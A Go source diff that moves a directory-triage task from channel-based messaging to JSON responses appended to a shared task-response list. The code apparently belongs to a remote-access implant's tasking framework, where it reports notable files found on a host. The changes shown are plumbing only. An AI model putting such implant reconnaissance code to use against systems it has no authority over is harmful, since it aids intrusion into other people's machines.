@@ -7,9 +7,11 @@ import (
 	"path/filepath"
 	"strings"
 	"sync"
-
+	"pkg/profiles"
 	"pkg/utils/structs"
 )
+
+var mu sync.Mutex
 
 type OSFile struct {
 	Path             string `json:"path"`
@@ -49,18 +51,19 @@ func NewDirectoryTriageResult() *DirectoryTriageResult {
 	}
 }
 
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
-
-	// do whatever here
-	tMsg.TaskItem = task
-	// log.Println("Task params:", string(task.Params))
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 
 	// log.Println("Parsed task params!")
 	if len(task.Params) == 0 {
-		tMsg.TaskResult = []byte("Error: No path given.")
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = "Error: No path given."
+		msg.Completed = true
+		msg.Status = "error"
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 	result := NewDirectoryTriageResult()
@@ -72,30 +75,54 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 	}
 	// fmt.Println(result)
 	if err != nil {
-		// fmt.Println("Error was not nil!", err.Error())
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
+		return
 	} else {
 		if !isDirectoryTriageResultEmpty(*result) {
 			data, err := json.MarshalIndent(result, "", "    ")
 			// // fmt.Println("Data:", string(data))
 			if err != nil {
 				// fmt.Println("Error was not nil when marshalling!", err.Error())
-				tMsg.TaskResult = []byte(err.Error())
-				tMsg.Error = true
+				msg.UserOutput = err.Error()
+				msg.Completed = true
+				msg.Status = "error"
+
+				resp, _ := json.Marshal(msg)
+				mu.Lock()
+				profiles.TaskResponses = append(profiles.TaskResponses, resp)
+				mu.Unlock()
+				return
 			} else {
-				// fmt.Println("Sending on up the data:\n", string(data))
-				tMsg.TaskResult = data
-				tMsg.Error = false
-				tMsg.Completed = true
+				msg.UserOutput = string(data)
+				msg.Completed = true
+				resp, _ := json.Marshal(msg)
+				mu.Lock()
+				profiles.TaskResponses = append(profiles.TaskResponses, resp)
+				mu.Unlock()
+				return
 			}
 		} else {
-			tMsg.TaskResult = []byte("Task completed and nothing noteworthy found.")
-			tMsg.Error = false
-			tMsg.Completed = true
+			msg.UserOutput = "Task completed and nothing noteworthy found."
+			msg.Completed = true
+			resp, _ := json.Marshal(msg)
+			mu.Lock()
+			profiles.TaskResponses = append(profiles.TaskResponses, resp)
+			mu.Unlock()
+			return
 		}
 	}
-	threadChannel <- tMsg
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
 
 func isDirectoryTriageResultEmpty(result DirectoryTriageResult) bool {
